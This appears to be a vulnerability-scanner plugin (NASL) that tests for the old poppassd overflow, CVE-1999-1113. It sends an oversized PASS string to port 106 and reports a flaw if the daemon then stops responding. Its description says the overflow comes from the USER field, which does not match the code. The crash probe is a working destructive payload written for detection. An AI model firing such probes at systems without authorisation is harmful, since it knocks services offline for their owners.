# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17295");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-1999-1113");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75");
  script_name("poppassd USER overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service1.nasl", "find_service_3digits.nasl");
  script_require_ports("Services/pop3pw", 106);

  script_tag(name:"solution", value:"Upgrade your software or use another one.");

  script_tag(name:"summary", value:"The remote poppassd daemon crashes when a too
  long name is sent after the USER command.");

  script_tag(name:"impact", value:"It might be possible for a remote attacker to run
  arbitrary code on this machine.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_probe");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:106, proto:"pop3pw");

soc = open_sock_tcp(port);
if(! soc)
  exit(0);

r = recv_line(socket:soc, length:4096);
if(r !~ '^200 ') {
  close(soc);
  exit(0);
}

vt_strings = get_vt_strings();

send(socket:soc, data:'USER ' + vt_strings["lowercase"] + '\r\n');
r = recv_line(socket:soc, length:4096);
if(r !~ '^200 ') {
  close(soc);
  exit(0);
}

send(socket:soc, data:'PASS '+crap(4096)+'\r\n');
line = recv_line(socket:soc, length:4096);
close(soc);

sleep(1);

soc = open_sock_tcp(port);
if (! soc) {
  security_message(port);
  exit(0);
}

if(! line) {
  security_message(port:port, data:"Note that the scanner did not crash the service, so this might be a false positive. However, if the poppassd service is run through inetd it is impossible to reliably test this kind of flaw.");
  exit(0);
}

exit(99);
